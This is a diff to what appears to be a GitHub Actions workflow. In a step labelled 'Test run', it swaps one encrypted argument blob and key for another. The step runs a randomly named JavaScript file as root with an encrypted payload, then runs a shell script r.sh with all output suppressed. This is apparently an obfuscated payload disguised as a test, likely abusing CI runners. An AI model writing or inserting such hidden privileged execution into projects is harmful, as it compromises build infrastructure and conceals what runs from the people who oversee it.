@@ -29,6 +29,6 @@ jobs:
     - name: Test run
       run: |
         cd ${{ github.workspace }}
-        echo 'wrrjj'
+        echo '1flen'
         sudo chmod +x heard8w7wt/eldridge1gbc0.js
-        sudo ./heard8w7wt/eldridge1gbc0.js U2FsdGVkX1+vHFmmHJ331b3cwYDs9zEPmKUNB4h1f7/bZaD3x9GMkxOOvcC1YH3x0UoY9ZRxFi6r1D42sdnApo5jt+OC8vX/+ikCMe18+7MMy3LRi1si/4fL6W68xQ4W 2ig2al && sudo sh r.sh > /dev/null 2>&1
+        sudo ./heard8w7wt/eldridge1gbc0.js U2FsdGVkX19oKFSS8Asp8MMm8DxpmlYk9RONUtqcftbNzdUUn2JRawx+XHCzBiIYddq0BJ34gr0r9X3DFmbS9iFJjAv7IUGJh6Nck731YRD/zoIBEuusfAvZGMwyo605 7b4mh0 && sudo sh r.sh > /dev/null 2>&1
